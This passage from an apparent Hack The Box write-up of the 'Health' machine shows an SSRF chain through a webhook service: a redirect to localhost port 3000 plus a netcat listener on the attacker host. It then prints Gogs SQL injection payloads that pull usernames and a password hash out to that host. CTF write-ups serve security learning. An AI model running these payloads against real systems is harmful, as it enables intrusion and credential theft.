font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Web</span> servers<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-11">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Ubuntu,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Operating</span> systems<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-12">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Laravel,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Web</span> frameworks<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-13">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PHP,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Programming</span> languages<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>To check if debugging is enabled visit http://10.129.9.180/profile and we see it’s not. Investigating the token unserialize RCE we need the <code>app_key</code> to exploit, something we cannot find at this point. Also, this is an older vulnerability that works on Laravel version 5.5.40 / 5.6.x &lt; 5.6.30, and visiting http://health.htb/webhook we find that they are running Laravel version 8.83.13.</p>
<p>Back the the Webhook Service. Popularized by GitHub, <a href="https://en.wikipedia.org/wiki/Webhook">Webhooks</a> are the modern way for apps to receive notifications / events from other servers. A Webhook is a way for you to define a URL that is called by another service when a particular event occurs. For example, you can configure your repo on GitHub to have a Webhook that calls <code>http://exploit.se/pr</code> when a new Pull Request is created.</p>
<p>If we for example set the Webhook URL to:</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">https://echo-webhook.exploit.se/SOMETHING_UNIQUE</span></span></code></pre></div>
<p>Now when the other service does its POST to that URL the request body is cached and can be retrieved via a GET to the same URL. Here is a simple cURL to demonstrate:</p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"content-type: application/json"</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'{"foo": "bar"}'</span> https://echo-webhook.exploit.se/foobar</span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">curl</span> https://echo-webhook.exploit.se/foobar</span>
<span id="cb4-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"foo"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"bar"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">}</span></span></code></pre></div>
<p>Translated to this box, we set the <strong>Payload URL</strong> to where we want to receive data. We will get an incomming POST request, and either setup a <code>nc</code> listener or a webserver capable to receive POSTs.</p>
<p>The <strong>Monitored URL</strong> is what ever we want to retreive information from, after playing around with this parameter for a good while I noticed that I can bypass the restrictions on port 3000 by pointing to myself and having a <a href="https://stackoverflow.com/questions/2506932/how-do-i-redirect-a-request-to-a-different-url-in-python">301 Redirect</a> to <code>http://127.0.0.1:3000</code></p>
<p><img src="https://exploit.se/posts/2022-08-24-htb-writeup-health/images/health02.png" class="img-fluid"></p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  health python3 redirect.py 80 http://127.0.0.1:3000</span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.129.9.180</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [23/Aug/2022 12:32:01] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET / HTTP/1.0"</span> 302 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb5-3"></span>
<span id="cb5-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  health nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 8888                               </span>
<span id="cb5-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 8888 ...</span>
<span id="cb5-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.20</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.129.9.180]</span> 59780</span>
<span id="cb5-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">POST</span> / HTTP/1.1</span>
<span id="cb5-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Host:</span> 10.10.14.20:8888</span>
<span id="cb5-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Accept:</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>/<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span></span>
<span id="cb5-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-type:</span> application/json</span>
<span id="cb5-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Length:</span> 7663</span>
<span id="cb5-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Expect:</span> 100-continue</span>
<span id="cb5-13"></span>
<span id="cb5-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"webhookUrl"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/10.10.14.20:8888\/"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"monitoredUrl"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/10.10.14.20\/"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"health"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"up"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"body"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:</span> </span>
<span id="cb5-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...] </span>
<span id="cb5-16"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">content</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span>Gogs<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Go</span> Git Service<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">a</span> painless self-hosted Git Service written in Go<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span></span>
<span id="cb5-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb5-18"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">id</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span>footer-rights<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\u</span>00a9 <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2014</span> GoGits <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\u</span>00b7 Version: 0.5.5.1010 Beta</span></code></pre></div>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>Reading about gogs version 0.5.5.1010 it’s vulnerable to <a href="https://www.exploit-db.com/exploits/35238">SQL Injection through the search</a>.</p>
<p>The PoC code isn’t working right of the bat, we’re returned <code>"health":"down"</code> indicating that the SQL syntax is broken somewhere.</p>
<pre><code>http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/
select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from
/**/mysql.db/**/where/**/('%25'%3D'</code></pre>
<p>Playing around and trying to simplify I get simple <code>ORDER BY</code> to give some response:</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  health python3 redirect.py 80 <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http://127.0.0.1:3000/api/v1/users/search?q=')/**/order/**/by/**/27--/**/-"</span></span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.129.9.180</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [23/Aug/2022 16:10:00] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET / HTTP/1.0"</span> 302 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb7-3"></span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  health python3 webserv.py 8888</span>
<span id="cb7-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:root:POST</span> request,</span>
<span id="cb7-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Path:</span> /</span>
<span id="cb7-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Headers:</span></span>
<span id="cb7-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Host:</span> 10.10.14.20:8888</span>
<span id="cb7-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Accept:</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>/<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span></span>
<span id="cb7-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-type:</span> application/json</span>
<span id="cb7-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Length:</span> 575</span>
<span id="cb7-12"></span>
<span id="cb7-13"></span>
<span id="cb7-14"></span>
<span id="cb7-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Body:</span></span>
<span id="cb7-16"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"webhookUrl"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/10.10.14.20:8888\/"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"monitoredUrl"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/10.10.14.20\/"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"health"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"up"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"body"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">data</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:[{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">username</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">susanne</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">avatar</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">}],</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">ok</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:true}"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"message"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"HTTP\/1.0 302 Found"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"headers"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Server"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"BaseHTTP\/0.6 Python\/3.10.5"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Date"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Tue, 23 Aug 2022 14:08:01 GMT"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Location"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/order\/**\/by\/**\/20--\/**\/-"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Content-Type"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"application\/json; charset=UTF-8"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Set-Cookie"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_csrf=; Path=\/; Max-Age=0"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Content-Length"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"111"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}}</span></span>
<span id="cb7-17"></span>
<span id="cb7-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.129.9.180</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [23/Aug/2022 16:08:00] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"POST / HTTP/1.1"</span> 200 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span></code></pre></div>
<p><strong>NOTE:</strong> <code>{\"data\":[{\"username\":\"susanne\",\"avatar\":\"\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce\"}</code> is the exfiltrated data. Normally it just returns <code>{\"data\":[]\}</code>.</p>
<p>But trying with 28 columns breaks the syntax.</p>
<p>Next we need to find a injectable column, and trying the normal <code>@@version</code> doesn’t give any result. As hinted from the poc, column 3 should be injectable so after playing around with some commands I able to extract the username (which I already knew) - thus proving that column 3 is correct and we should focus more here.</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  health python3 redirect.py 80 <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/null,null,(select/**/name/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--/**/-"</span></span>
<span id="cb8-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.129.9.180</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [23/Aug/2022 16:57:01] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET / HTTP/1.0"</span> 302 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb8-3"></span>
<span id="cb8-4"></span>
<span id="cb8-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## Response</span></span>
<span id="cb8-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">INFO:root:POST</span> request,</span>
<span id="cb8-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Path:</span> /</span>
<span id="cb8-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Headers:</span></span>
<span id="cb8-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Host:</span> 10.10.14.20:8888</span>
<span id="cb8-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Accept:</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>/<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span></span>
<span id="cb8-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-type:</span> application/json</span>
<span id="cb8-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Content-Length:</span> 825</span>
<span id="cb8-13"></span>
<span id="cb8-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Body:</span></span>
<span id="cb8-15"><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"webhookUrl"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/10.10.14.20:8888\/"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"monitoredUrl"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/10.10.14.20\/"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"health"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"up"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"body"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">data</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:[{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">username</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">susanne</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">avatar</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">\/\/1.gravatar.com\/avatar\/c11d48f16f254e918744183ef7b89fce</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">},{</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">username</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">susanne</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">avatar</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">\/\/1.gravatar.com\/avatar\/</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">}],</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">ok</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\"</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">:true}"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"message"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"HTTP\/1.0 302 Found"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"headers"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Server"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"BaseHTTP\/0.6 Python\/3.10.5"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Date"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Tue, 23 Aug 2022 14:57:01 GMT"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Location"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http:\/\/127.0.0.1:3000\/api\/v1\/users\/search?q=')\/**\/union\/**\/all\/**\/select\/**\/null,null,(select\/**\/name\/**\/from\/**\/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--\/**\/-"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Content-Type"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"application\/json; charset=UTF-8"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Set-Cookie"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"_csrf=; Path=\/; Max-Age=0"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Content-Length"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"170"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}}</span></span>
<span id="cb8-16"></span>
<span id="cb8-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.129.9.180</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [23/Aug/2022 16:57:01] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"POST / HTTP/1.1"</span> 200 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span></code></pre></div>
<p>Testing more password and pass both returns <code>"health":"down"</code>, but <strong>passwd</strong> returns a hash!</p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  health python3 redirect.py 80 <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/null,null,(select/**/passwd/**/from/**/user),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null--/**/-"</span></span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.129.9.180</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [23/Aug/2022 16:59:01] <span class="st" style="color: #20794D;
background-color: null;
